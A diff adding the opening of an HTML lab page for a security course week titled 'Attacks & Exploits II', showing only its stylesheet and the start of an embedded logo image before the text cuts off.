@@ -1,0 +1,238 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Week 7 Lab &mdash; Attacks &amp; Exploits II (Project Phase 3b)</title>
+<style>
+:root{--navy:#14294a;--teal:#0f8b80;--teal-l:#e3f4f2;--coral:#d9573b;--amber:#c98a12;--amber-l:#fbf2dc;--line:#dfe4ec;--muted:#5b6678;--bg:#f4f6fa;--font:Inter,system-ui,-apple-system,Segoe UI,Roboto,Arial,sans-serif;--mono:"JetBrains Mono",ui-monospace,Menlo,Consolas,monospace}
+*{box-sizing:border-box} body{margin:0;font-family:var(--font);color:#1c2533;background:var(--bg);line-height:1.6;font-size:17px}
+header{background:linear-gradient(135deg,#0d1d36,#14294a 60%,#103a49);color:#fff;padding:44px 24px 36px}
+header .in{max-width:1180px;margin:0 auto}
+header .eb{color:#7fd8cd;font-weight:700;letter-spacing:.14em;text-transform:uppercase;font-size:13px}
+header h1{margin:10px 0 6px;font-size:40px;line-height:1.15} header p{margin:0;color:#c9d7ec;max-width:860px}
+.meta{display:flex;flex-wrap:wrap;gap:10px;margin-top:18px} .meta span{background:rgba(255,255,255,.1);border-radius:999px;padding:5px 14px;font-size:14px}
+.wrap{max-width:1180px;margin:0 auto;display:grid;grid-template-columns:270px 1fr;gap:28px;padding:28px 24px 80px}
+nav{position:sticky;top:16px;align-self:start;background:#fff;border:1px solid var(--line);border-radius:14px;padding:14px}
+nav b{display:block;font-size:12px;letter-spacing:.1em;text-transform:uppercase;color:var(--muted);margin:2px 6px 8px}
+nav a{display:flex;justify-content:space-between;gap:8px;padding:7px 8px;border-radius:8px;color:var(--navy);text-decoration:none;font-size:14.5px;font-weight:600}
+nav a span{color:var(--muted);font-weight:500;white-space:nowrap} nav a:hover{background:var(--teal-l)}
+nav .tools{border-top:1px solid var(--line);margin-top:10px;padding-top:10px;display:flex;flex-direction:column;gap:6px}
+nav button{font:inherit;font-size:14px;border:1px solid var(--line);background:#f7f9fc;border-radius:8px;padding:6px;cursor:pointer;color:var(--navy);font-weight:600}
+.card{background:#fff;border:1px solid var(--line);border-radius:14px;padding:20px 24px;margin-bottom:22px}
+.card h2{margin:0 0 8px;color:var(--navy)}
+.part{background:#fff;border:1px solid var(--line);border-radius:16px;padding:24px 28px;margin-bottom:26px}
+.phead{display:flex;justify-content:space-between;align-items:center;gap:12px;border-bottom:3px solid var(--teal);padding-bottom:10px;margin-bottom:14px}
+.phead h2{margin:0;color:var(--navy);font-size:26px}
+.together{background:#e3f4f2;border-left:5px solid #0f8b80;padding:8px 12px;border-radius:0 10px 10px 0;margin:0 0 12px;font-weight:700;color:#075e56}
+.goal{background:var(--amber-l);border-left:5px solid var(--amber);padding:10px 14px;border-radius:0 10px 10px 0;margin-bottom:12px}
+.task{border:1px solid var(--line);border-radius:12px;padding:16px 20px;margin:18px 0;background:#fbfcfe}
+.task h3{margin:0 0 8px;color:var(--navy)}
+.lbl{font-size:12px;font-weight:800;letter-spacing:.1em;text-transform:uppercase;color:var(--muted);margin:14px 0 6px}
+pre{margin:0;background:#0f1b2d;color:#dbe6f5;border-radius:10px;padding:14px 16px;overflow:auto;font-family:var(--mono);font-size:14px;line-height:1.55}
+pre.out{background:#eef2f8;color:#1c2533;white-space:pre-wrap}
+.explain{background:var(--teal-l);border-radius:10px;padding:10px 14px}
+code{font-family:var(--mono);font-size:.88em;background:#eef2f8;padding:1px 5px;border-radius:5px;color:#20406e}
+pre code{background:none;padding:0;color:inherit;font-size:inherit}
+kbd{font-family:var(--mono);font-size:.8em;background:#eef1f6;border:1px solid #c9d1de;border-bottom-width:3px;border-radius:6px;padding:1px 6px}
+table.canvas{border-collapse:collapse;width:100%;margin-top:8px} table.canvas th{background:var(--navy);color:#fff;text-align:left;padding:8px 12px;width:210px} table.canvas td{border:1px solid var(--line);padding:8px 12px}
+a{color:#2f6fd0} .chk{background:var(--teal-l);border:2px solid var(--teal);border-radius:12px;padding:14px 18px;font-weight:600}
+.solbtn{margin-top:14px;font:inherit;font-weight:700;font-size:15px;background:var(--teal);color:#fff;border:0;border-radius:9px;padding:8px 16px;cursor:pointer}
+.sol{display:none;border-top:2px dashed var(--teal);margin-top:14px;padding-top:10px} .sol.on{display:block}
+.note{background:#fbf2dc;border-left:5px solid #c98a12;padding:10px 14px;border-radius:0 10px 10px 0;margin:12px 0;font-size:15.5px}
+.warn{background:#fbe9e4;border-left:5px solid #d9573b;padding:10px 14px;border-radius:0 10px 10px 0;margin:12px 0;font-size:15.5px}
+header .top{display:flex;justify-content:space-between;align-items:center;margin-bottom:18px} header .top img{height:58px}
+header .wk{background:#0f8b80;border-radius:999px;padding:6px 16px;font-weight:800;font-size:14px}
+main{min-width:0} pre,pre.out{overflow-x:auto;max-width:100%}
+@media (max-width:860px){.wrap{grid-template-columns:1fr} nav{position:static} header h1{font-size:30px}}
+@media print{nav{display:none} .wrap{display:block} .sol{display:block} .solbtn{display:none}}
+</style>
+</head>
+<body>
+<header>
+<div class="top"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAlgAAAD4CAMAAAAHO2gpAAABIFBMVEUAAADYAA/+/v7+/v7kABH+AAC3AADXAA/YAA79+PnUAAzYAA/XAA/XAA/+/f3++/zXAA/++fn+/Px/AAD++Pn85uj76OvnZW752NjdKDX41tj2yMz75+n3yMrqeoLxpaviSFL7vLzbGCT76+3ulpz/f3/shY33qazgOUXvnKLlWWPztrv2mJjkUlvpc3vaERzeMjz1u9D/2ezamZn/AP/1vMGqVVW/f3/87u/0lrL3qs363uB/f3+qqqq4///aACTiABD/yOv32du/v7/Uf3/fv7/gMT7/f///qv/43uP//78A//9/AH9///+ZAAC2ACS/P3/UVVXMZmbUqtTU1NTgABHhAA//AFX/Var/f7/77/EAAAAAAAAAAAAAAAAAAADmO3O0AAAAYHRSTlMA/v0D/gIDrSpvENBsUdCQkFCuAjEVLf8P/////wz///8H/0n/Av8G/////wj/////DBAHAf8DBGsJB/8CAwMH1gciBAYI/wIDKwQBAgIFBwQGBQYGOnADAwSDAAAAAACmJAVsAAArjElEQVR42u2dB3/bOpboKYGgWERSVHFkO45LruP05LaZO213Znbftre9vLLf/4MsAIIkQKJRBEk5P2DvThJTomjj73MOTvW8b3PBOPag55ZbtlecQm/nfgzzreCsljUhA714HTuy3LK+dl64cdpwxpWe17JHQuClK6cN51v+Wa1FaA+FwFuvYujImmktzmtZBAvpwU3i7Zw2dGBZBgvJrNXKg44sB5ZlsCCMFysvcGQ5sOyChZRhuNggweXWHMb7NwwWPhr6a0fWHGuzWpwTW5bBQkxtHFkzrTjdJAv/GwULBjDxU0fW9IuYtjDcJOcht2yDhc0s3w8dWTMsSA7kcbryv0WwEFlrP3HBnbnYwr/RqYlCPMWdPitYCKmVv4qd02FGuRUneghWfVeSUBznAmsH44XvnA5zsuXFOnXor05yU4bpGh8Q/FnAQt8XksXuaDinIe/FOkW4gjHst+q7h+uVXteOARZRhujOThnOSFbq6yQW7C+x0AqIvAi1aI0C1m6HlGESu6jhnJYWY2a9vfta/fXh1au3p4LV2DqImVBjxo0CFvmF8V08elaRta42/tPVcrm8flH+43K5fDMULMKtF2/86cEi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